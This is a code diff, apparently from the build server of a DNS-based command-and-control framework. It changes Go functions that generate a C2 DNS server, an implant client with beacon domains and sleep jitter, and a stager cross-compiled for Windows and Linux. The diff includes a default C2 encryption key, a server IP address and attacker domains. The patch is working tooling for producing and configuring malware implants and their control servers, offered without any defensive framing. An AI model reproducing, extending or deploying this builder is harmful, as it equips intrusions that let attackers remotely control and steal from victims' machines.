@@ -265,17 +265,17 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 		return "", fmt.Errorf("failed to read config: %w", err)
 	}
 
-	// Replace embedded config values
+	// Replace embedded config values in tryLoadEmbeddedConfig()
 	configStr := string(config)
-	configStr = strings.Replace(configStr, `Domain:        "secwolf.net"`, fmt.Sprintf(`Domain:        "%s"`, req.Domain), 1)
-	configStr = strings.Replace(configStr, `NS1:           "ns1.secwolf.net"`, fmt.Sprintf(`NS1:           "%s"`, req.NS1), 1)
-	configStr = strings.Replace(configStr, `NS2:           "ns2.secwolf.net"`, fmt.Sprintf(`NS2:           "%s"`, req.NS2), 1)
-	configStr = strings.Replace(configStr, `UpstreamDNS:   "8.8.8.8:53"`, fmt.Sprintf(`UpstreamDNS:   "%s"`, req.UpstreamDNS), 1)
-	configStr = strings.Replace(configStr, `EncryptionKey:  "MySecretC2Key123!@#DefaultChange"`, fmt.Sprintf(`EncryptionKey:  "%s"`, req.EncryptionKey), 1)
+	configStr = strings.Replace(configStr, `Domain:        "secwolf.net",`, fmt.Sprintf(`Domain:        "%s",`, req.Domain), 1)
+	configStr = strings.Replace(configStr, `NS1:           "ns1.secwolf.net",`, fmt.Sprintf(`NS1:           "%s",`, req.NS1), 1)
+	configStr = strings.Replace(configStr, `NS2:           "ns2.secwolf.net",`, fmt.Sprintf(`NS2:           "%s",`, req.NS2), 1)
+	configStr = strings.Replace(configStr, `UpstreamDNS:   "8.8.8.8:53",`, fmt.Sprintf(`UpstreamDNS:   "%s",`, req.UpstreamDNS), 1)
+	configStr = strings.Replace(configStr, `EncryptionKey: "MySecretC2Key123!@#DefaultChange",`, fmt.Sprintf(`EncryptionKey: "%s",`, req.EncryptionKey), 1)
 	if req.ServerAddress != "" {
-		configStr = strings.Replace(configStr, `SvrAddr:       "98.90.218.70"`, fmt.Sprintf(`SvrAddr:       "%s"`, req.ServerAddress), 1)
+		configStr = strings.Replace(configStr, `SvrAddr:       "98.90.218.70",`, fmt.Sprintf(`SvrAddr:       "%s",`, req.ServerAddress), 1)
 	}
-	// Set distributed mode config
+	// Set distributed mode config (required fields)
 	configStr = strings.Replace(configStr, `MasterServer:   "",`, fmt.Sprintf(`MasterServer:   "%s",`, masterURL), 1)
 	configStr = strings.Replace(configStr, `MasterAPIKey:   "",`, fmt.Sprintf(`MasterAPIKey:   "%s",`, apiKey), 1)
 	configStr = strings.Replace(configStr, `MasterServerID: "dns1",`, fmt.Sprintf(`MasterServerID: "%s",`, serverID), 1)
@@ -357,7 +357,8 @@ func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
 	}
 	domainsStr += "}"
 
-	// Replace values
+	// Replace values in Client/config.go (embedded variable format)
+	// Note: Client uses different spacing than Server - match exact format
 	configStr = strings.Replace(configStr, `DNSDomains:          []string{"secwolf.net", "errantshield.com"},`, fmt.Sprintf(`DNSDomains:          %s,`, domainsStr), 1)
 	configStr = strings.Replace(configStr, `SleepMin:             60,`, fmt.Sprintf(`SleepMin:             %d,`, req.SleepMin), 1)
 	configStr = strings.Replace(configStr, `SleepMax:             120,`, fmt.Sprintf(`SleepMax:             %d,`, req.SleepMax), 1)
@@ -437,24 +438,42 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 		return "", fmt.Errorf("failed to write stager.c: %w", err)
 	}
 
-	// Build using make
+	// Build using direct gcc/mingw compilation (no make required)
 	ext := ""
-	target := "linux"
+	var cmd *exec.Cmd
+	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
+
 	if req.Platform == "windows" {
 		ext = ".exe"
-		target = "windows"
+		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
+
+		// Windows: Use mingw-w64 cross-compiler
+		// x86_64-w64-mingw32-gcc -Wall -O2 -s stager.c -o stager-windows-x64.exe -lws2_32 -static
+		cmd = exec.Command("x86_64-w64-mingw32-gcc",
+			"-Wall", "-O2", "-s",
+			"stager.c",
+			"-o", filepath.Base(outputPath),
+			"-lws2_32", "-static")
+	} else {
+		// Linux: Use standard gcc
+		// gcc -Wall -O2 -s -m64 stager.c -o stager-linux-x64 -lz
+		cmd = exec.Command("gcc",
+			"-Wall", "-O2", "-s", "-m64",
+			"stager.c",
+			"-o", filepath.Base(outputPath),
+			"-lz")
 	}
 
-	cmd := exec.Command("make", target)
 	cmd.Dir = buildDir
-
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
 	}
 
-	// Return path to built binary (still in temp dir)
-	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
+	// Verify binary was created
+	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
+		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
+	}
 
 	return outputPath, nil
 }
